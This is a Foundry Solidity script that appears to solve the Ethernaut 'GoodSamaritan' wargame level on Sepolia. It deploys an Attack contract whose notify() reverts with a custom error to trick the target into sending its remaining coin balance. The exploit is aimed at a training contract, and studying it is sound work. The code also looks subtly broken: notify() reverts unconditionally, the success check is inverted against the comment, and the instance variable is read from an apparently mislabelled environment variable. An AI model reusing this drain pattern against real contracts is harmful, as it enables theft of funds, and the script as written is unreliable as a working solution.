// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/GoodSamaritan.s.sol --tc GoodSamaritanSolution --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv

contract GoodSamaritanSolution is Script { 
    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address public instance = payable(vm.envAddress("FORCE_INSTANCE"));

    /* Attack idea:
        The idea is simply, we need to revert with a custom error NotEnoughBalance() to trigger the catch block in the requestDonation function
        this will make the contract to send all the remaining coins to the attacker
        We will create a contract that will revert with the NotEnoughBalance() error when it receives the coins
        notice that it will call the notify function if the dest_ address is a contract (our attack contract)
        Using the notify function we can trigger the revert with the NotEnoughBalance() custom error
    */

    function run() external {
        vm.startBroadcast(deployerPrivateKey);
        // create an instance of the attack contract with the GoodSamaritan instance address
        Attack attackContract = new Attack(instance);

        // call the attack function
        attackContract.attack();
        vm.stopBroadcast();
    }


}



interface INotifyable {
    function notify(uint256 amount) external;
}

contract Attack is INotifyable {

    error NotEnoughBalance();
    
    address goodSamaritanInstance;

    constructor(address _instance) {
        goodSamaritanInstance = _instance;
    }

    function notify(uint256 amount) external override {
        revert NotEnoughBalance();
    }

    function attack() public {
        (bool success, ) = goodSamaritanInstance.call(abi.encodeWithSignature("requestDonation()"));
        // Notice that in the try catch block it returns false if the error is caught
        require(!success, "Attack failed");
    }
}